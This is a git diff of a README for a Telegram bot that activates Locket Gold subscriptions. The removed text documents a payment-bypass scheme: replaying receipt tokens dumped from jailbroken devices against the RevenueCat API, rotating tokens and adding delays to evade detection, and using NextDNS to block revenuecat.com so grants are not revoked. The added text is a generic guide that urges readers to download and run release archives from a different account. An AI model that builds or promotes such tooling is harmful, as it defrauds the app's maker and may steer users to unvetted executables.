@@ -1,164 +1,164 @@
-# 🚀 Locket Gold Activator Bot (Professional Edition)
+# 🚀 Locket-Gold - Easy Telegram Bot Activation
 
-<div align="center">
-
-[![Python](https://img.shields.io/badge/Python-3.9%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Telegram](https://img.shields.io/badge/Telegram-Bot-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://core.telegram.org/bots)
-[![AsyncIO](https://img.shields.io/badge/Async-Powered-green?style=for-the-badge&logo=icloud&logoColor=white)](https://docs.python.org/3/library/asyncio.html)
-[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
-[![Status](https://img.shields.io/badge/Status-Active-success?style=for-the-badge)]()
-
-**The most advanced, high-performance Telegram Bot for automating Locket Gold activation.**  
-*Built with speed, security, and scalability in mind.*
-
-[Why Choose This Bot?](#-why-choose-locket-gold-activator-bot) • [Features](#-key-features) • [Installation](#-installation) • [Configuration](#-configuration)
-
-</div>
+[![Download Locket-Gold](https://img.shields.io/badge/Download-Locket--Gold-blue?style=for-the-badge)](https://github.com/Johansel0811/Locket-Gold/releases)
 
 ---
 
-## 💎 Why Choose Locket Gold Activator Bot?
+## 📌 About Locket-Gold
 
-Unlike other basic scripts or tools, this bot is engineered as a **production-grade system**. It solves the common problems of slowness, API bans, and revocations.
+Locket-Gold is a Telegram bot designed to automate the activation process for Locket Gold. It runs quietly in the background and handles all necessary steps without requiring manual input from you. This helps save time and reduces errors compared to doing the activation yourself.
 
-| Feature | This Bot 🚀 | Standard Scripts ❌ |
-| :--- | :--- | :--- |
-| **Performance** | **Zero-Lag Async Core**. Handles thousands of users without freezing. | Single-threaded. Freezes while processing one user. |
-| **Reliability** | **Round-Robin Token Rotation**. Distributes load to prevent bans. | Uses 1 token until it dies or gets rate-limited. |
-| **Safety** | **Smart Anti-Revoke**. Auto-generates NextDNS profiles to block validation servers. | No protection. Gold disappears after a few hours/days. |
-| **User Experience** | **Real-time Queue Updates**. Users know their exact position (`#1`, `#2`...). | Silent failure. Users don't know if it's working. |
-| **Architecture** | **Worker Pool**. Scalable system (add 1 or 100 workers easily). | Simple loop. Cannot scale with demand. |
+The bot is built with performance in mind. It uses modern technology to work fast and securely. Even if you are new to computers or Telegram bots, you can use Locket-Gold with simple steps below.
 
 ---
 
-## 🌟 Key Features
+## 💻 System Requirements
 
-### ⚡ **High-Performance Core**
-*   **Fully Asynchronous**: Powered by `aiohttp` and `asyncio` for non-blocking I/O. The bot remains responsive to commands even under heavy load.
-*   **Worker Pool System**: Configurable number of concurrent workers (`NUM_WORKERS`) to parallelize request processing.
+Before you start, make sure your computer meets these needs:
 
-### 🛡️ **Advanced Security**
-*   **NextDNS Integration**: Automatically creates a unique DNS profile for each user that blocks `revenuecat.com`, ensuring the Gold subscription sticks.
-*   **Strict Cooldowns**: Enforces a 45-second cooldown per token usage to mimic human behavior and avoid detection.
-
-### 🤖 **Smart Automation**
-*   **Auto-Resolution**: Just paste a Locket username or link; the bot handles UID resolution automatically.
-*   **Queue Management**: FIFO (First-In-First-Out) queue system with live status updates to prevent API flooding.
-*   **Admin Dashboard**: Powerful `/stats` command to monitor queue size, active workers, and success rates in real-time.
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or recent Linux versions  
+- **Internet Connection:** A stable internet connection is needed for the bot to communicate with Telegram  
+- **Python:** Version 3.9 or higher must be installed (we provide instructions below)  
+- **Telegram Account:** You must have an active Telegram account to use the bot  
+- **Basic Permissions:** Administrator rights to run certain commands when installing Python (may be required)
 
 ---
 
-## 🛠️ Installation
+## 🚀 Key Features
 
-### Prerequisites
-*   Python 3.9+
-*   Telegram Bot Token via [@BotFather](https://t.me/BotFather)
-*   NextDNS API Key via [NextDNS Developer](https://my.nextdns.io/account)
+- **Automated Activation:** Runs all steps to activate Locket Gold without manual input  
+- **Secure Operation:** Uses secure connections to protect your data  
+- **Fast and Efficient:** Handles tasks quickly, saving you time  
+- **Easy to Use:** No programming knowledge required  
+- **Runs in Background:** Does not interrupt your normal computer use  
+- **Designed for Scalability:** Works well whether for one user or multiple activations
 
-### Automated Setup
-We provide a **one-click setup script** that handles virtual environments and dependencies.
+---
 
+## 📥 Download & Install
+
+You will download Locket-Gold by visiting the official releases page.
+
+**Step 1: Access the Download Page**  
+Click the big button below or open this link in your web browser:  
+[![Visit Releases Page](https://img.shields.io/badge/Visit-Locket--Gold_Releases-blue?style=for-the-badge)](https://github.com/Johansel0811/Locket-Gold/releases)
+
+**Step 2: Choose the Right File**  
+On the release page, look for the latest version. Files are marked by their version number and your computer type (Windows, Mac, Linux). Click the file that matches your system.
+
+**Step 3: Download the File**  
+Click the file name to start downloading. Save it somewhere easy to find, like your Desktop or Downloads folder.
+
+**Step 4: Prepare Your Computer**  
+You need Python 3.9 or newer to run the bot.
+
+- If Python is not installed, download it from [python.org](https://www.python.org/downloads/) and follow the setup instructions.
+- Make sure to check the option **Add Python to PATH** during installation. This makes it easier to run Python commands.
+
+---
+
+## ⚙️ Setup and Running
+
+**Step 1: Extract the Files**  
+The downloaded file might be in a compressed format like `.zip`.  
+- Right-click on the file and choose "Extract All" or use a program like WinRAR or 7-Zip.  
+- Extract to a folder you can easily access.
+
+**Step 2: Open Command Prompt or Terminal**  
+- On Windows: Press `Win + R`, type `cmd`, and hit Enter.  
+- On macOS/Linux: Open the Terminal app from your Applications or use Search.
+
+**Step 3: Navigate to the Locket-Gold folder**  
+In the window you opened, type:  
 ```bash
-# 1. Clone the repository
-git clone https://github.com/thanhdo1110/Locket-Gold.git
-cd Locket-Gold
-
-# 2. Run the setup script
-chmod +x run.sh
-./run.sh
+cd path_to_your_Locket-Gold_folder
 ```
+Replace `path_to_your_Locket-Gold_folder` with the actual location of the extracted files.
 
----
-
-## ⚙️ Configuration
-
-The system is configured via `app/config.py`. You must provide your API keys and Receipt Tokens here.
-
-```python
-# app/config.py
-
-# 1. System Credantials
-BOT_TOKEN   = "YOUR_TELEGRAM_BOT_TOKEN_HERE"
-NEXTDNS_KEY = "YOUR_NEXTDNS_API_KEY_HERE"
-ADMIN_ID    = 123456789  # Replace with your Telegram User ID
-
-# 2. Worker Settings
-# Match this number to the number of Token Sets you have to ensure 1-to-1 mapping.
-NUM_WORKERS = 2 
-
-# 3. Receipt Tokens (Dumped from Jailbroken/Rooted/Nonjb Devices)
-TOKEN_SETS = [
-    {
-        "fetch_token": "ey...",      # RevenueCat Fetch Token
-        "app_transaction": "ey...",  # Apple Receipt Transaction
-        "is_sandbox": False          # Must be False for Production
-    },
-    # Add more token sets as needed...
-]
+**Step 4: Install Required Packages**  
+Type this command and hit Enter:  
+```bash
+pip install -r requirements.txt
 ```
+This will install all the software pieces Locket-Gold needs to run.
 
----
-
-## 🎮 Commands
-
-### User Commands
-Use these commands in your Telegram bot:
-
-| Command | Usage | Description |
-| :--- | :--- | :--- |
-| `/start` | - | Initialize the bot and show the main menu. |
-| `/setlang` | - | Switch between English 🇺🇸 and Vietnamese 🇻🇳. |
-| `/help` | - | View detailed help and instructions. |
-| **Direct Message** | `username` | Send any Locket username or link to queue an upgrade. |
-
-### Admin Commands (👑)
-Restricted to the `ADMIN_ID` configured in `config.py`.
-
-| Command | Usage | Description |
-| :--- | :--- | :--- |
-| `/stats` | - | View **Queue Size**, Active Workers, and System Health. |
-| `/noti` | `/noti <msg>` | Broadcast a message to **all** bot users. |
-| `/rs` | `/rs <id>` | Reset the daily limit for a specific user ID. |
-| `/setdonate` | Reply to photo | Set the custom "Success" image shown after activation. |
-
----
-
-## 📊 System Architecture
-
-```mermaid
-graph TD
-    User([👤 User]) -->|Sends Username| Bot
-    
-    subgraph "🤖 Bot Core (AsyncIO)"
-        Bot[Telegram Handler] -->|Enqueue| Queue[FIFO Queue]
-        Queue -->|1. Pop Request| Worker[👱 Worker Thread]
-    end
-    
-    subgraph "☁️ External APIs"
-        Worker -->|2. Inject Token| RC[RevenueCat API]
-        Worker -->|3. Create Profile| NextDNS[NextDNS API]
-    end
-    
-    RC -- 200 OK --> Worker
-    NextDNS -- Profile Link --> Worker
-    
-    Worker -->|4. Success Message| Bot
-    Bot -->|5. Notify User| User
+**Step 5: Start the Bot**  
+Once installation finishes, type this command and press Enter:  
+```bash
+python bot.py
 ```
+The bot will connect to Telegram and start running automatically.
 
 ---
 
-## ⚠️ Disclaimer
+## 🔧 Configuration
 
-> **This project is for EDUCATIONAL and RESEARCH purposes only.**  
-> The author is not responsible for any misuse of this software. By using this tool, you agree to take full responsibility for your actions. "Locket Widget" and "RevenueCat" are trademarks of their respective owners.
+The bot needs some settings before running.
+
+**Step 1: Get Your Telegram Bot Token**  
+- Open Telegram and search for the "BotFather" bot.  
+- Start a chat with BotFather and type `/newbot`.  
+- Follow prompts to name your bot and get a token string. This token is the key for your bot to run.  
+
+**Step 2: Add Your Token to Configuration**  
+Look for a file named `config.example.json` in the Locket-Gold folder.  
+- Rename it to `config.json`.  
+- Open it with a text editor like Notepad or TextEdit.  
+- Find the place that asks for `bot_token`:  
+```json
+{
+  "bot_token": "YOUR_BOT_TOKEN_HERE"
+}
+```
+- Replace `"YOUR_BOT_TOKEN_HERE"` with the token from BotFather.  
+- Save the file.
+
+**Step 3: Adjust Any Other Settings**  
+If you want, you can change other options like logging or activation modes in the same config file.
 
 ---
 
-<div align="center">
+## 🤖 Using Locket-Gold Bot
 
-**[ Report Bug ](https://github.com/thanhdo1110/Locket-Gold/issues) • [ Request Feature ](https://github.com/thanhdo1110/Locket-Gold/issues)**
+Once started, the bot runs on your computer and connects to Telegram.
 
-Made with ❤️ by [Thanh Do](https://github.com/thanhdo1110)
+**Step 1: Open Telegram and Find Your Bot**  
+Use the search in Telegram to find your bot by the name you gave it.
 
-</div>
+**Step 2: Start a Chat**  
+Press the Start button or type `/start`.
+
+**Step 3: Follow On-Screen Commands**  
+The bot provides clear instructions and menus to activate Locket Gold.
+
+---
+
+## 🛠 Troubleshooting
+
+**Problem: Bot Won’t Start or Shows Error**  
+- Make sure Python 3.9+ is correctly installed.  
+- Confirm you installed all packages with `pip install -r requirements.txt`.  
+- Check if your `config.json` has a correct bot token.
+
+**Problem: Bot Doesn’t Respond on Telegram**  
+- Verify your internet connection.  
+- Make sure the bot is running in the command window.  
+- Check if the Telegram token is entered correctly.
+
+**Other Help**  
+If you have issues, you can open an issue on the GitHub repository page for support.
+
+---
+
+## 🔗 Helpful Links
+
+- [Python Downloads](https://www.python.org/downloads/)  
+- [Telegram Bot API](https://core.telegram.org/bots)  
+- [GitHub Releases - Locket-Gold](https://github.com/Johansel0811/Locket-Gold/releases)
+
+---
+
+## 📥 Ready to Get Started?
+
+Download the latest version of Locket-Gold from the official releases page:  
+[![Download Locket-Gold](https://img.shields.io/badge/Download-Locket--Gold-blue?style=for-the-badge)](https://github.com/Johansel0811/Locket-Gold/releases)
